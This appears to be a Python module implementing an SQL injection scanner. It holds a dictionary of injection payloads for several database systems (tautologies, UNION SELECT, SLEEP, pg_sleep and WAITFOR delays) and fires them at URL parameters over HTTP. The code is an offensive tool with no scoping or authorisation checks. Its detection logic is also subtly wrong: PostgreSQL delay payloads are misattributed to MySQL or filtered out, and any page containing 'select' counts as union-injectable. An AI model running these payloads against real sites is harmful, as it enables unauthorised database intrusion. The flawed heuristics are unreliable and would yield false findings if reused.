from ..deps import *

class PurePythonSQLMap:
    """Pure Python SQL injection scanner"""
    
    def __init__(self):
        self.payloads = self.load_payloads()
        self.techniques = ["boolean", "error", "union", "time"]
    
    def load_payloads(self) -> Dict[str, List[str]]:
        """Load SQL injection payloads"""
        return {
            "generic": [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1' /*",
                "\" OR \"1\"=\"1",
                "\" OR \"1\"=\"1\" --",
                "' OR 'a'='a",
                "' OR 'a'='a' --"
            ],
            "mysql": [
                "' AND SLEEP(5) --",
                "' AND 1=IF(2>1,SLEEP(5),0) --",
                "' UNION SELECT NULL,NULL --",
                "' UNION SELECT 1,@@version --"
            ],
            "postgresql": [
                "' AND pg_sleep(5) --",
                "' AND 123=(SELECT CAST((SELECT version()) AS INTEGER)) --"
            ],
            "mssql": [
                "' WAITFOR DELAY '00:00:05' --",
                "' AND 1=CONVERT(int, @@version) --"
            ],
            "oracle": [
                "' AND 123=(SELECT 123 FROM DUAL) --",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1 --"
            ]
        }
    
    async def scan(self, url: str, params: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """Scan for SQL injection vulnerabilities"""
        
        results = {
            "url": url,
            "vulnerable": False,
            "technique": None,
            "parameter": None,
            "dbms": None,
            "payloads": [],
            "confidence": 0.0
        }
        
        # Extract parameters from URL if not provided
        if params is None:
            params = self.extract_parameters(url)
        
        # Test each parameter
        for param_name, param_value in params.items():
            for technique in self.techniques:
                vulnerability = await self.test_parameter(
                    url, param_name, param_value, technique
                )
                
                if vulnerability["vulnerable"]:
                    results["vulnerable"] = True
                    results["technique"] = technique
                    results["parameter"] = param_name
                    results["dbms"] = vulnerability.get("dbms")
                    results["payloads"].append(vulnerability["payload"])
                    results["confidence"] = max(
                        results["confidence"], 
                        vulnerability["confidence"]
                    )
        
        return results
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract parameters from URL"""
        params = {}
        
        try:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            for key, values in query_params.items():
                if values:
                    params[key] = values[0]
        
        except Exception as e:
            pass
        
        return params
    
    async def test_parameter(self, url: str, param: str, value: str, 
                           technique: str) -> Dict[str, Any]:
        """Test a parameter for SQL injection"""
        
        result = {
            "vulnerable": False,
            "technique": technique,
            "parameter": param,
            "payload": "",
            "dbms": None,
            "confidence": 0.0
        }
        
        # Get payloads for this technique
        test_payloads = self.get_payloads_for_technique(technique)
        
        # Get baseline response
        baseline = await self.make_request(url, param, value)
        if not baseline:
            return result
        
        baseline_time = baseline.get("time", 0)
        baseline_content = baseline.get("content", "")
        baseline_status = baseline.get("status", 0)
        
        for payload in test_payloads:
            test_response = await self.make_request(url, param, payload)
            
            if not test_response:
                continue
            
            test_time = test_response.get("time", 0)
            test_content = test_response.get("content", "")
            test_status = test_response.get("status", 0)
            
            # Check for vulnerability based on technique
            if technique == "boolean":
                if self.detect_boolean_injection(baseline_content, test_content):
                    result["vulnerable"] = True
                    result["payload"] = payload
                    result["confidence"] = 0.8
                    result["dbms"] = self.identify_dbms(test_content)
            
            elif technique == "error":
                if self.detect_error_injection(test_content):
                    result["vulnerable"] = True
                    result["payload"] = payload
                    result["confidence"] = 0.9
                    result["dbms"] = self.identify_dbms_from_error(test_content)
            
            elif technique == "time":
                if test_time - baseline_time > 5:  # 5 second delay
                    result["vulnerable"] = True
                    result["payload"] = payload
                    result["confidence"] = 0.7
                    result["dbms"] = self.identify_dbms_from_payload(payload)
            
            elif technique == "union":
                if self.detect_union_injection(test_content):
                    result["vulnerable"] = True
                    result["payload"] = payload
                    result["confidence"] = 0.85
        
        return result
    
    def get_payloads_for_technique(self, technique: str) -> List[str]:
        """Get payloads for specific technique"""
        all_payloads = []
        
        for dbms, payloads in self.payloads.items():
            all_payloads.extend(payloads)
        
        # Filter by technique
        if technique == "time":
            time_payloads = [p for p in all_payloads if "SLEEP" in p or "DELAY" in p]
            return time_payloads[:5]  # Limit to 5
        
        elif technique == "union":
            union_payloads = [p for p in all_payloads if "UNION" in p]
            return union_payloads[:5]
        
        elif technique == "error":
            error_payloads = [p for p in all_payloads if "'" in p or "\"" in p]
            return error_payloads[:10]
        
        else:  # boolean
            boolean_payloads = [p for p in all_payloads if "OR" in p or "AND" in p]
            return boolean_payloads[:10]
    
    async def make_request(self, url: str, param: str, value: str) -> Optional[Dict]:
        """Make HTTP request"""
        try:
            # Build URL with parameter
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            # Update parameter
            query_params[param] = [value]
            
            # Rebuild URL
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            new_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            # Make request
            start_time = time.time()
            
            async with aiohttp.ClientSession() as session:
                async with session.get(new_url, timeout=10) as response:
                    content = await response.text()
                    end_time = time.time()
                    
                    return {
                        "url": new_url,
                        "status": response.status,
                        "content": content,
                        "time": end_time - start_time,
                        "headers": dict(response.headers)
                    }
        
        except Exception as e:
            return None
    
    def detect_boolean_injection(self, baseline: str, test: str) -> bool:
        """Detect boolean-based SQL injection"""
        # Compare responses
        if baseline == test:
            return False
        
        # Check for common boolean patterns
        true_indicators = [
            "welcome", "logged in", "success", "found", "exists",
            "true", "correct", "valid", "1 rows", "1 records"
        ]
        
        false_indicators = [
            "error", "failed", "invalid", "not found", "no records",
            "0 rows", "incorrect", "wrong", "access denied"
        ]
        
        baseline_lower = baseline.lower()
        test_lower = test.lower()
        
        # Check if one response indicates true and other false
        baseline_true = any(indicator in baseline_lower for indicator in true_indicators)
        test_true = any(indicator in test_lower for indicator in true_indicators)
        
        baseline_false = any(indicator in baseline_lower for indicator in false_indicators)
        test_false = any(indicator in test_lower for indicator in false_indicators)
        
        return (baseline_true and test_false) or (baseline_false and test_true)
    
    def detect_error_injection(self, content: str) -> bool:
        """Detect error-based SQL injection"""
        error_patterns = [
            r"SQL.*error",
            r"syntax.*error",
            r"mysql.*error",
            r"postgresql.*error",
            r"oracle.*error",
            r"microsoft.*sql",
            r"odbc.*driver",
            r"database.*error",
            r"unclosed.*quotation",
            r"incorrect.*syntax"
        ]
        
        content_lower = content.lower()
        for pattern in error_patterns:
            if re.search(pattern, content_lower):
                return True
        
        return False
    
    def detect_union_injection(self, content: str) -> bool:
        """Detect union-based SQL injection"""
        # Check for union output in response
        union_indicators = [
            "different number of columns",
            "union",
            "select",
            "order by"
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in union_indicators)
    
    def identify_dbms(self, content: str) -> Optional[str]:
        """Identify DBMS from response"""
        content_lower = content.lower()
        
        if "mysql" in content_lower:
            return "MySQL"
        elif "postgresql" in content_lower or "postgres" in content_lower:
            return "PostgreSQL"
        elif "microsoft sql" in content_lower or "mssql" in content_lower:
            return "MSSQL"
        elif "oracle" in content_lower:
            return "Oracle"
        elif "sqlite" in content_lower:
            return "SQLite"
        
        return None
    
    def identify_dbms_from_error(self, content: str) -> Optional[str]:
        """Identify DBMS from error message"""
        content_lower = content.lower()
        
        if "mysql" in content_lower:
            return "MySQL"
        elif "postgres" in content_lower:
            return "PostgreSQL"
        elif "sql server" in content_lower:
            return "MSSQL"
        elif "oracle" in content_lower:
            return "Oracle"
        elif "sqlite" in content_lower:
            return "SQLite"
        
        return None
    
    def identify_dbms_from_payload(self, payload: str) -> Optional[str]:
        """Identify DBMS from payload"""
        payload_lower = payload.lower()
        
        if "sleep" in payload_lower:
            return "MySQL"
        elif "pg_sleep" in payload_lower:
            return "PostgreSQL"
        elif "waitfor" in payload_lower:
            return "MSSQL"
        elif "dbms_pipe" in payload_lower:
            return "Oracle"
        
        return None
